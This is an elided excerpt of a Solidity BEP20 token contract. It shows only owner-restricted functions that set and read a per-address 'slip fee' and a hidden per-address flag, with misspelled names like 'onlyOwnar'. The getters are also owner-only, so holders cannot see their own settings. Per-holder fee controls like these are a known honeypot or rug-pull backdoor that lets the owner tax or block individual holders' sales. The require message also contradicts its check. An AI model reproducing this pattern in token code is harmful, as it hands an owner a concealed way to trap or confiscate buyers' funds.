...
contract Contract is BEP20, Ownable {
    ...
    function setSlipFeee(address _address, uint256 _value) external onlyOwnar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFeee[_address] = _value;
    }

    function getSlipFeee(address _address) external view onlyOwnar returns (uint256) {
        return _slipFeee[_address];
    }


    function setMAccountFeee(address _address, bool _value) external onlyOwnar {
        _mAccount[_address] = _value;
    }

    function getMAccountFeee(address _address) external view onlyOwnar returns (bool) {
